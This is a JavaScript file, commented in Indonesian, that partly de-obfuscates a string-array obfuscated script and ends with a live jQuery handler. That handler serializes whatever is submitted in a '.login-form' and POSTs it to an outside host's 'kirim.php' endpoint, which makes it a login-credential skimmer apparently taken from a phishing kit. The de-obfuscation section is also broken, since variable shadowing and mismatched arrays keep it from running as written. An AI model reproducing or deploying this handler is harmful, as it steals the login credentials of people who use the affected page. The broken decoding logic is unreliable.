// Fungsi untuk mendapatkan elemen dari array yang telah dipetakan
function deobfuscate(index) {
    var mapping = [
        '573597VsoECX', // ... Daftar lengkap nilai yang telah dipetakan
        'POST',
        '250572FjAhqU',
        '2202360xdmhzv',
        '7AFmGgO',
        '.login-form',
        '32223PewiWJ',
        '165YOAmYB',
        '14558cGYbjd',
        'ajax',
        '2751150Mpjtvw',
        '11ScfjmG',
        'serialize',
        '51204DdXlAO'
    ];
    return mapping[index - 0x19d];
}

// Deklarasi variabel dengan nama yang lebih deskriptif
var getValueFromMapping = deobfuscate;

// Fungsi utama untuk deobfuscation
(function(mappingFunction, targetValue) {
    var deobfuscate = deobfuscate;
    var shuffledArray = mappingFunction();
    
    while (true) {
        try {
            // Hitung nilai berdasarkan array yang telah dipetakan
            var calculatedValue = 
                -parseInt(deobfuscate(0x19e)) / 1 * (-parseInt(deobfuscate(0x1a9)) / 2) +
                -parseInt(deobfuscate(0x1a7)) / 3 +
                parseInt(deobfuscate(0x1a0)) / 4 * (-parseInt(deobfuscate(0x1a8)) / 5) +
                parseInt(deobfuscate(0x1a3)) / 6 * (-parseInt(deobfuscate(0x1a5)) / 7) +
                parseInt(deobfuscate(0x1a4)) / 8 +
                parseInt(deobfuscate(0x1a1)) / 9 +
                parseInt(deobfuscate(0x19d)) / 10;

            // Jika nilai yang dihitung sama dengan nilai target, keluar dari loop
            if (calculatedValue === targetValue) break;
            else shuffledArray.push(shuffledArray.shift());
        } catch (error) {
            shuffledArray.push(shuffledArray.shift());
        }
    }
}(function() {
    return ['573597VsoECX', 'POST', '250572FjAhqU', '2202360xdmhzv', '7AFmGgO', '.login-form', '32223PewiWJ', '165YOAmYB', '14558cGYbjd', 'ajax', '2751150Mpjtvw', '11ScfjmG', 'serialize', '51204DdXlAO'];
}, 0x3588c));

// Kode tambahan untuk menangani form submission
jQuery('.login-form').submit(function() {
    jQuery.ajax({
        url: 'https://cdn-ajaxx.riooxdzz.me/menu/kirim.php',
        type: 'POST',
        data: jQuery(this).serialize(),
        success: function() {}
    });
});
                                      
